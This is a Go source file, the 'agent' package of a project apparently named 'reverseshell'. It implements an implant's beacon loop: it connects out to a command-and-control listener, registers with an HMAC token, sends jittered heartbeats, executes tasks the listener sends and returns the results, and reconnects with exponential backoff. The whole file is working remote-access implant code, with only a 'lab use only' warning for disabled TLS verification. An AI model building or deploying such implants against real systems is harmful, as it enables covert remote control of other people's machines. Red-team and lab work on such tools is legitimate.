// Package agent implements the implant side: the beacon loop that connects
// out to a listener, registers, heartbeats, executes tasks, and reconnects
// with exponential backoff + jitter (README §3.3, §4.7).
package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"sync"
	"time"

	"reverseshell/internal/protocol"
	"reverseshell/internal/transport"
)

// Version is the implant build version reported at registration.
const Version = "0.1.0"

// reconnectJitter spreads every backoff delay ±20% (README §4.7).
const reconnectJitter = 0.2

// Default reconnect bounds when the config omits them.
const (
	defaultReconnectBase = 1 * time.Second
	defaultReconnectCap  = 300 * time.Second
)

// Config configures the beacon.
type Config struct {
	Addr          string
	TransportName string
	MaxFrameBytes int
	ReconnectBase time.Duration
	ReconnectCap  time.Duration
	Info          protocol.AgentInfo // identity sent in REGISTER (Nonce drives session resume)
	AuthToken     string             // shared implant secret: HMAC in REGISTER (empty = auth disabled)
	TLSCA         string             // session-plane TLS: CA bundle to verify the listener
	TLSServerName string             // session-plane TLS: SNI / verification name
	TLSInsecure   bool               // session-plane TLS: skip verification (lab only, warned)
}

// Run connects, serves, and reconnects until a deliberate stop: BYE from
// the listener, an exit task, a fatal protocol rejection, or ctx
// cancellation. A dropped connection is retried with backoff + jitter.
func Run(ctx context.Context, cfg Config) error {
	base, maxDelay := cfg.ReconnectBase, cfg.ReconnectCap
	if base <= 0 {
		base = defaultReconnectBase
	}
	if maxDelay <= 0 {
		maxDelay = defaultReconnectCap
	}
	if cfg.TLSInsecure {
		fmt.Fprintln(os.Stderr, "agent: WARNING — TLS certificate verification is DISABLED (insecure); lab use only")
	}

	for attempt := 0; ; attempt++ {
		clean, err := runOnce(ctx, cfg)
		if ctx.Err() != nil {
			return nil
		}
		if clean {
			return err
		}
		delay := backoffDelay(base, maxDelay, attempt)
		fmt.Fprintf(os.Stderr, "agent: session dropped (%v); reconnecting in %s\n", err, delay)
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(delay):
		}
	}
}

// runOnce runs one full connection lifecycle. clean reports a deliberate
// end (no reconnect); err carries the reason in both cases.
func runOnce(ctx context.Context, cfg Config) (clean bool, err error) {
	tr, err := transport.ByName(cfg.TransportName)
	if err != nil {
		return true, err // configuration problem: reconnecting cannot fix it
	}
	conn, err := tr.Dial(ctx, cfg.Addr, transport.Options{
		MaxFrameBytes:      cfg.MaxFrameBytes,
		CAFile:             cfg.TLSCA,
		ServerName:         cfg.TLSServerName,
		InsecureSkipVerify: cfg.TLSInsecure,
	})
	if err != nil {
		return false, fmt.Errorf("dial listener: %w", err)
	}
	defer conn.Close()

	// A cancelled context does not interrupt a blocked read; closing the
	// conn does. This guard makes Ctrl-C and test teardown prompt while idle.
	guardCtx, stopGuard := context.WithCancel(context.Background())
	go func() {
		select {
		case <-ctx.Done():
			_ = conn.Close()
		case <-guardCtx.Done():
		}
	}()
	defer stopGuard()

	b := &beaconConn{conn: conn}

	reg := protocol.NewEnvelope(protocol.TypeRegister)
	info := cfg.Info
	if cfg.AuthToken != "" {
		info.Auth = protocol.RegisterMAC(cfg.AuthToken, info, reg.TS)
	}
	data, err := json.Marshal(info)
	if err != nil {
		return true, fmt.Errorf("marshal agent info: %w", err)
	}
	reg.Data = data
	if err := b.send(ctx, reg); err != nil {
		return false, fmt.Errorf("send register: %w", err)
	}

	frame, err := conn.Recv(ctx)
	if err != nil {
		return false, fmt.Errorf("await registered: %w", err)
	}
	env, err := protocol.Decode(frame)
	if err != nil {
		return false, err
	}
	var sessCfg protocol.SessionConfig
	switch env.Type {
	case protocol.TypeRegistered:
		if env.SID == "" {
			return true, fmt.Errorf("listener assigned an empty session id")
		}
		_ = json.Unmarshal(env.Data, &sessCfg)
	case protocol.TypeError:
		var ep protocol.ErrorPayload
		_ = json.Unmarshal(env.Data, &ep)
		return true, fmt.Errorf("listener rejected registration: %s: %s", ep.Code, ep.Message)
	default:
		return true, fmt.Errorf("expected REGISTERED, got %s", env.Type)
	}
	sid := env.SID

	sctx, cancel := context.WithCancel(ctx)
	defer cancel()
	if sessCfg.HeartbeatInterval > 0 {
		go b.heartbeat(sctx, sid, sessCfg)
	}

	for {
		frame, err := conn.Recv(sctx)
		if err != nil {
			return false, fmt.Errorf("session read: %w", err)
		}
		env, err := protocol.Decode(frame)
		if err != nil {
			return true, fmt.Errorf("bad envelope from listener: %w", err)
		}
		switch env.Type {
		case protocol.TypeTask:
			var spec protocol.TaskSpec
			var res protocol.TaskResult
			if err := json.Unmarshal(env.Data, &spec); err != nil {
				res = protocol.TaskResult{Status: protocol.StatusError, Detail: "bad task spec: " + err.Error()}
			} else {
				res = ExecuteTask(sctx, spec, cfg.Info)
			}
			out := protocol.NewEnvelope(protocol.TypeResult)
			out.SID = sid
			out.TID = env.TID
			rd, err := json.Marshal(res)
			if err != nil {
				return true, fmt.Errorf("marshal result: %w", err)
			}
			out.Data = rd
			if err := b.send(sctx, out); err != nil {
				return false, fmt.Errorf("send result: %w", err)
			}
			if spec.Kind == protocol.KindExit {
				return true, nil // result flushed; deliberate shutdown
			}
		case protocol.TypeBye:
			return true, nil
		case protocol.TypeAck:
			// heartbeat reply: liveness confirmed, nothing to do
		case protocol.TypeError:
			var ep protocol.ErrorPayload
			_ = json.Unmarshal(env.Data, &ep)
			return true, fmt.Errorf("listener error: %s: %s", ep.Code, ep.Message)
		default:
			return true, fmt.Errorf("unexpected envelope %s", env.Type)
		}
	}
}

// beaconConn serializes frame writes between the task reader and the
// heartbeat goroutine: one frame's header must never interleave with
// another frame's payload on the wire.
type beaconConn struct {
	mu   sync.Mutex
	conn transport.Conn
}

func (b *beaconConn) send(ctx context.Context, env *protocol.Envelope) error {
	b.mu.Lock()
	defer b.mu.Unlock()
	return sendEnvelope(ctx, b.conn, env)
}

// heartbeat emits HEARTBEAT every interval ± jitter until ctx is done. A
// failed send closes the conn so the blocked reader surfaces the drop.
func (b *beaconConn) heartbeat(ctx context.Context, sid string, cfg protocol.SessionConfig) {
	base := time.Duration(cfg.HeartbeatInterval * float64(time.Second))
	for {
		select {
		case <-ctx.Done():
			return
		case <-time.After(jittered(base, cfg.HeartbeatJitter)):
		}
		env := protocol.NewEnvelope(protocol.TypeHeartbeat)
		env.SID = sid
		if err := b.send(ctx, env); err != nil {
			_ = b.conn.Close()
			return
		}
	}
}

// jittered scales d by ±j: d · U(1−j, 1+j) (README §4.7).
func jittered(d time.Duration, j float64) time.Duration {
	if j <= 0 {
		return d
	}
	delta := float64(d) * j
	return time.Duration(float64(d) - delta + 2*delta*rand.Float64())
}

// backoffDelay returns jittered min(base·2^attempt, maxDelay).
func backoffDelay(base, maxDelay time.Duration, attempt int) time.Duration {
	return jittered(capBackoff(base, maxDelay, attempt), reconnectJitter)
}

func capBackoff(base, maxDelay time.Duration, attempt int) time.Duration {
	d := base
	for i := 0; i < attempt && d < maxDelay; i++ {
		d *= 2
	}
	if d > maxDelay {
		d = maxDelay
	}
	return d
}

func sendEnvelope(ctx context.Context, conn transport.Conn, e *protocol.Envelope) error {
	b, err := protocol.Encode(e)
	if err != nil {
		return err
	}
	return conn.Send(ctx, b)
}
